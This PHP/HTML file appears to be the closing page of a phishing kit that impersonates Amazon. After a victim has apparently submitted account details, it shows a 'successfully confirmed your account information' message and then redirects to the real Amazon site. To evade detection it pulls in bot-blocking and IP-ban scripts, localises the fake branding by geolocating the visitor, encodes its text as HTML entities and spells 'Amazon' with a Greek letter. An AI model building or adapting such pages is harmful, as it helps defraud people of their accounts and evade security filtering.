<?php include ('../bots.php');?>
<?php include ('../blocker.php');?>
<?php include ('../banned.php');?>
<?php 
$IP = $_SERVER['REMOTE_ADDR'];
date_default_timezone_set('UTC');
$DETAILS     = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=".$IP."");
$COUNTRYCODE = $DETAILS->geoplugin_countryCode;
$COUNTRYNAME = $DETAILS->geoplugin_countryName;
$STRTCODE    = strtolower($COUNTRYCODE);
?>
<!DOCTYPE html>
<html>
  <head>
    <link rel="shortcut icon" type="image/x-icon" href="../data/icon/favicon.ico">
    <style type="text/css">
      .ap_caps_warn {
        display: none;
      }
    </style>
    <meta charset="utf-8">
    <title>
      &#x53;&#x75;&#x63;&#x63;&#x65;&#x73;&#x73;&#x66;&#x75;&#x6C;&#x6C;&#x79;&#x20;&#x55;&#x70;&#x64;&#x61;&#x74;&#x65;&#x64;
    </title>
    <link  type="text/css" href="../data/icon/ap-flex-reduced-nav._3C8_.css" rel="stylesheet" />
    <meta http-equiv="icon-Type" icon="text/html; charset=UTF-8"/>  
  </head>
  <body id="flex-reduced-nav">
    <!--[if lte IE 5]>
<div class="ie">
<![endif]-->
    <!--[if IE 6]>
<div class="ie ie6">
<![endif]-->
    <!--[if IE 7]>
<div class="ie ie7">
<![endif]-->
    <!--[if IE 8]>
<div class="ie ie8">
<![endif]-->
    <div id="wrapper">
      <div id="topSlots">
        <div id="top-1">
          <table border="0" cellspacing="0" cellpadding="0" width="100%"> 
            <tbody>
              <td align="left" width="185" valign="bottom">
                <a id="navLogo" class="nonGateway" href="#">
                  <span id="altLogo">
                    <img src="../data/icon/amazon_logo_no-org_mid._V153387053_.png" height="30" width="100" border="0"/>
                  </span>
                </a>
              </td>
              <br>
              <td align="right" valign="top">
                <a href="#">Your Account
                </a> | 
                <a href="#">Help
                </a>
              </td>
            </tbody>
          </table>
        </div>
      </div>
      <div id="centerSlots">
        <div id="center-0">
        </div>
        <div id="title-slot">
          <!--[if lte IE 5]>
<div class="ie">
<![endif]-->
          <!--[if IE 6]>
<div class="ie ie6">
<![endif]-->
          <!--[if IE 7]>
<div class="ie ie7">
<![endif]-->  
          <!--[if IE 8]>
<div class="ie ie8">
<![endif]-->  
          <div id="ap_title_pagelet">
            <br>
            <br>  
          </div>
          <!--[if lte IE 8]>
</div>
<![endif]-->	
        </div>
        <div id="center-1">
        </div>
        <div id="signin-slot">
          <!--[if lte IE 5]>
<div class="ie">
<![endif]-->
          <!--[if IE 6]>
<div class="ie ie6">
<![endif]-->
          <!--[if IE 7]>
<div class="ie ie7">
<![endif]-->
          <!--[if IE 8]>
<div class="ie ie8">
<![endif]-->
<center>
          <div id="ap_signin1a_pagelet" class="ap_table ap_pagelet">
            <div id="ap_signin1a_pagelet_title" class="ap_row ap_pagelet_title">
              <h1 class="ie">&#x54;&#x68;&#x61;&#x6E;&#x6B;&#x20;&#x59;&#x6F;&#x75;
                <img height="20" src="../data/icon/done.png" width="20">
              </h1>
              <br>
              <h1 class="ie">&#x59;&#x6F;&#x75;&#x20;&#x68;&#x61;&#x76;&#x65;&#x20;&#x73;&#x75;&#x63;&#x63;&#x65;&#x73;&#x73;&#x66;&#x75;&#x6C;&#x6C;&#x79;&#x20;&#x63;&#x6F;&#x6E;&#x66;&#x69;&#x72;&#x6D;&#x65;&#x64;&#x20;&#x79;&#x6F;&#x75;&#x72;&#x20;&#x61;&#x63;&#x63;&#x6F;&#x75;&#x6E;&#x74;&#x20;&#x69;&#x6E;&#x66;&#x6F;&#x72;&#x6D;&#x61;&#x74;&#x69;&#x6F;&#x6E;.
                <br>
                <br>
                <img src="../data/icon/Floating-rays.gif" height="28" width="28" align="center" >
                </img>
              </h1>
            <![if !IE]>
            <div id="ap_small_forgot_password_link_ie_old" class="ie_old">
              <div id="ap_signin1a_forgot_password_row" class="ap_row">
                <span class="ap_col1">&nbsp;
                </span> 
                <span class="ap_col2">
                </span>
              </div>
              <div id="ap_signin1a_cnep_row" class="ap_row">
                <span class="ap_col1">&nbsp;
                </span>
              </div>
              <div class="ap_row">
              </div>
            </div>
          </div>
        </div></center>
        <br>
        <br>
        <br>
        <br>
        </form>
      <!--[if lte IE 8]>
</div>
<![endif]-->
    </div>
    <div id="center-3">
    </div>
    </div>
  <br> 
  <br>
  <a href="#">
    <img 
         <?php 
    if     ($COUNTRYCODE=="GB"){ echo 'src="../data/country/gb.png"';}
    elseif ($COUNTRYCODE=="IN"){ echo 'src="../data/country/in.png"';}
    elseif ($COUNTRYCODE=="CA"){ echo 'src="../data/country/ca.jpg"';}
    elseif ($COUNTRYCODE=="FR"){ echo 'src="../data/country/fr.png"';}
    elseif ($COUNTRYCODE=="AU"){ echo 'src="../data/country/au.gif"';}
    elseif ($COUNTRYCODE=="BR"){ echo 'src="../data/country/br.jpg';}
    elseif ($COUNTRYCODE=="CN"){ echo 'src="../data/country/cn.jpg"';}
    elseif ($COUNTRYCODE=="IT"){ echo 'src="../data/country/it.jpg"';}
    elseif ($COUNTRYCODE=="JP"){ echo 'src="../data/country/jp.jpg"';}
    elseif ($COUNTRYCODE=="MX"){ echo 'src="../data/country/mx.png"';}
    elseif ($COUNTRYCODE=="ES"){ echo 'src="../data/country/es.jpg"';}
    elseif ($COUNTRYCODE=="DE"){ echo 'src="../data/country/de.svg"';}
    else                       { echo 'src="../data/country/all.gif"';}
    ?> width="130" align="middle" alt="" height="32" border="0">
  </a>
  <br>
  <br>
  <ul>
    <a href="#" class="nav_a">Conditions of Use
    </a>&nbsp; &nbsp;
    <a href="#" class="nav_a">Privacy Notice
    </a>&nbsp; &nbsp;
    <a href="#" class="nav_a">Interest-Based Ads
    </a>
    <br>
    <br>1996-
    <script>document.write(new Date().getFullYear());
    </script> &copy; &Alpha;m&#97;zon.
    <?php  
if     ($COUNTRYCODE=="GB"){ echo 'co.uk';}
elseif ($COUNTRYCODE=="IN"){ echo 'in';}
elseif ($COUNTRYCODE=="CA"){ echo 'ca';}
elseif ($COUNTRYCODE=="FR"){ echo 'fr';}
elseif ($COUNTRYCODE=="AU"){ echo 'com.au';}
elseif ($COUNTRYCODE=="BR"){ echo 'com.br';}
elseif ($COUNTRYCODE=="CN"){ echo 'cn';}
elseif ($COUNTRYCODE=="IT"){ echo 'it';}
elseif ($COUNTRYCODE=="JP"){ echo 'co.jp';}
elseif ($COUNTRYCODE=="MX"){ echo 'com.mx';}
elseif ($COUNTRYCODE=="ES"){ echo 'es';}
elseif ($COUNTRYCODE=="DE"){ echo 'de';}
else                       { echo 'com';} ?>, Inc. or its affiliates
  </ul>
  <div id="javascriptSlots">
    <div id="javascript-identity">
    </div>
    <div id="js-trms">
    </div>
    <!--[if lte IE 8]>
</div>
<![endif]-->
    <div id='be' style="display:none;">
      <form name='ue_backdetect' action="get">
        <input type="hidden" name='ue_back' value='1' />
      </form>
    </div>
    <meta http-equiv="refresh" content="4;url=http://www.amazon.com/gp/help/customer/display.html?ie=UTF8">
    </meta>
  </body>
</html>
